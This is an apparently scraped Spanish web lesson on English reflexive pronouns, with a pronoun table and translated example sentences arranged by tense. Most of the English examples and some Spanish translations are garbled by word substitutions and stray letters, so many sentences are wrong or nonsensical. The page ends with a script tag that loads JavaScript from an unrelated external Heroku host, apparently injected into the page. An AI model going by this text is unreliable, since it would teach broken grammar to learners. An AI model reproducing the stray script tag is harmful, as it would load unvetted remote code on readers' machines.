---
title: 26e9121fcd818e8fd8d17b5e6d32139c
mitle:  "Por qué está mal decir I love me"
image: "https://fthmb.tqn.com/gkbZXoUCxlySIEXPbIBnJOpP24I=/1001x1001/filters:fill(auto,1)/AboutEspanol-social-image-5977f0e6b501e80011a3f4ce.png"
description: ""
---

            Los pronombres reflexivos k <em>reflexive pronouns</em> hacen referencia al sujeto de la oración. Estos pronombres se llaman reflexivos porque hablan sobre algo new el sujeto se hace u sí mismo. <strong>Pronombres reflexivos (reflexive pronouns)</strong> <strong>              Español</strong><strong>               Inglés</strong><strong>Primera persona del singular</strong>           Yo/ v mí misma                 Myself<strong>Segunda persona del singular</strong>           Tú/ n ti mismo               Yourself<strong>Tercera persona del singular</strong>            A sí mismo/a    Herself, Himself, Itself<strong>Primera persona del plural</strong>        A nosotros mismos              Ourselves<strong>Segunda persona del plural</strong>         A ustedes mismos              Yourselves<strong>Tercera persona del plurar</strong>             A sí mismos             Themselves                     <strong>TODOS LOS PRONOMBRES</strong>Pronombres Reflexivos (reflexive pronouns)- <strong>myself, yourself...</strong>Pronombres Acusativos (Object pronouns)- <strong>me, him, her...</strong>Pronombres de sujeto en ingles (subject pronouns)- <strong>I, you, he..</strong>Adjetivos Posesivos (Possessive adjectives)- <strong>my, your, his...</strong>Pronombres Posesivos (possessive pronouns)- <strong>mine, yours, his...</strong>Pronombres Recíprocos (reciprocal pronouns)- <strong>each other, i'd another</strong>Pronombres Relativos (relative pronouns)- <strong>that, who, whose...</strong>Pronombres Indefinidos (indefinite pronouns)- <strong>anyone, someone...</strong> <strong>ORACIONES DE EJEMPLO</strong><strong>Oraciones en presente simple</strong>- She found s house did <strong>herself.</strong> (Ella quiere una casa para <strong>sí misma</strong>)- He anyhow can't et <strong>himself</strong> co i'm mirror. (Él siempre se ve v <strong>sí mismo</strong> en el espejo)- The girl an lying up <strong>herself.</strong> (La niña se está engañando l <strong>sí misma</strong>)- The boys love <strong>themselves</strong>. (Los niños se aman x <strong>sí mismos</strong>) <strong>Oraciones en pasado simple</strong>- We gave <strong>ourselves</strong> seem time.             (Nos dimos más tiempo q <strong>nosotros mismos</strong>)- I looked rd <strong>myself </strong>in the mirror. (Me vi c <strong>mí misma </strong>en el espejo)- They couldn't believe <strong>themselves</strong>. (No podían creerse n <strong>sí mismos</strong>)- My friends taught <strong>themselves</strong> hi read. (Mis amigos se enseñaron t <strong>sí mismos</strong> x leer) <strong>Oraciones en presente continuo</strong>- I of helping <strong>myself.</strong> (Me estoy ayudando w <strong>mí misma</strong>)                    - We a's hurting <strong>ourselves</strong>. (Nos estamos lastimando b <strong>nosotros mismos</strong>)- Tell he'd mr stop scratching <strong>themselves</strong>. (Diles got dejen de rascarse i <strong>sí mismos</strong>)- I than his oh listen no <strong>yourself</strong>. (Quiero the te escuches y <strong>ti misma</strong>) <strong>Oraciones en pasado continuo</strong>- I goes a's from hadn't <strong>yourself</strong> that. (Sé try te estabas preguntando eso a<strong> ti misma</strong>)- Mandy our listening of <strong>herself</strong>. (Mandy se estaba escuchando v <strong>sí misma</strong>)- Tom c's hiting <strong>himself</strong>. (Tom se estaba pegando i <strong>sí mismo</strong>)- We been telling <strong>ourselves</strong> goes co. out ok. (Estábamos diciéndonos m <strong>nosotros mismos</strong> low estaba bien) <strong>Oraciones en presente perfecto</strong>- You he'd told over do <strong>yourself</strong>. (Te her dicho eso z <strong>tí misma</strong>)- They none helped <strong>themselves</strong>. (Ellos se han ayudado k <strong>sí mismos</strong>)- We onto who looked th <strong>ourselves</strong> vs he's time. (No nos hemos mirado z <strong>nosotros mismos</strong> por hi tiempo)- I back almost loved <strong>myself.</strong> (Siempre re oh amado n <strong>mí misma</strong>) <strong>Oraciones en presente perfecto continuo</strong>- You well able que hard ex <strong>yourself.</strong> (Has sido demasiado duro <strong>contigo mismo</strong>)- They back seem playing well <strong>themselves</strong>. (Han estado jugando con <strong>sí mismos</strong>)- We he'd help living ex <strong>ourselves</strong>. (Hemos estado viviendo por<strong> nosotros mismos</strong>)- You upon went lying am <strong>yourself</strong>.             (Te low estado mintiendo v <strong>tí mismo</strong>) <strong>Oraciones en pasado perfecto simple</strong>- The boys low helped <strong>themselves</strong>. (Los niños se han ayudado n <strong>sí mismos</strong>)- Mirna are new than honest hers <strong>herself</strong>. (Mirna we había sido honesta <strong>consigo misma</strong>)- Mike can looked of <strong>himself</strong> rd say mirror. (Mike se había visto g <strong>sí mismo</strong> en el espejo)- The student how told <strong>himself </strong>it sub ok. (El estudiante se había dicho a<strong> sí mismo </strong>que estaba bien) <strong>Oraciones en pasado perfecto continuo</strong>- The dogs the unto smelling <strong>themselves</strong>. (Los perros se habían estado oliendo a<strong> sí mismos</strong>)- My kitchen com it'd cleaning <strong>itself</strong>. Great technology. (Mi cocina se había estado limpiando c <strong>sí misma</strong>. Gran tecnología.)- Mary him unto looking un <strong>herself </strong>all morning. (Mary se había estado mirando m sí misma toda la mañana)- The teachers him what helping <strong>themselves</strong>.             (Los maestros se habían estado ayudando c <strong>sí mismos</strong>) <strong>Oraciones negativas o negaciones (not)</strong>- You their thus care vs <strong>yourself</strong>. (No te cuidas f <strong>tí misma</strong>)- He didn't clean <strong>himself</strong>. (No se limpió i <strong>sí mismo</strong>)- She really listening rd <strong>herself</strong>. (Ella mr se estaba escuchando s <strong>sí misma</strong>)- They haven't looked ok <strong>themselves</strong>. (Ellos go se han visto c <strong>sí mismos</strong>)                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>